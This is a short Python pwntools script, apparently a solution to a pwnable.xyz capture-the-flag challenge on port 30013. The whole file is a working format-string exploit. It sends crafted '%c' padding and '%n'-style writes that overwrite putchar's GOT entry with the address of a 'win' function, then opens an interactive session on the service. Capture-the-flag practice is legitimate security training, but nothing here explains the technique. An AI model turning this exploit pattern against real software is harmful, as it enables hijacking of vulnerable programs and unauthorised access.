from pwn import *

r = remote("svc.pwnable.xyz", 30013)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40094C
putchar_got = 0x602020

desc = f"%{str(win)}c%36$ln".encode()
name = f"%{str(putchar_got)}c%6$ln".ljust(len(desc) + 2, "A").encode()

sla(b"Name: ", name)
sla(b"Desc: ", desc)
sla(b"> ", b"3")

r.recvline()

r.interactive()
